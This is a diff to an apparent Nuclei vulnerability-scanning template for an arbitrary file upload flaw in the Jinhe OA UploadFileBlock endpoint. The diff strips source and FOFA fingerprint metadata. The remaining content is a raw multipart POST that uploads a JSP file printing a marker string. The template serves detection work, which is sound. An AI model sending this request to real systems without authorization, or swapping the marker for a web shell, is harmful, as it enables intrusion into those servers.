@@ -3,12 +3,8 @@ info:
   name: 金和OA UploadFileBlock接口存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rggpgb5o0ety62iz'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rggpgb5o0ety62iz
-    fofa: app="金和网络-金和OA"||body="/jc6/platform/sys/login"
 http:
 - raw:
   - 'POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1
@@ -32,14 +28,10 @@ http:
     Content-Type: multipart/form-data; boundary=bbcea0206207b8222ea7bdee4e0f92fa
 
 
-
-
     --bbcea0206207b8222ea7bdee4e0f92fa
 
 
     Content-Disposition: form-data; name="filename"; filename="dudesite.jsp"
-
-
 
 
     <% out.println("dudesite"); %>
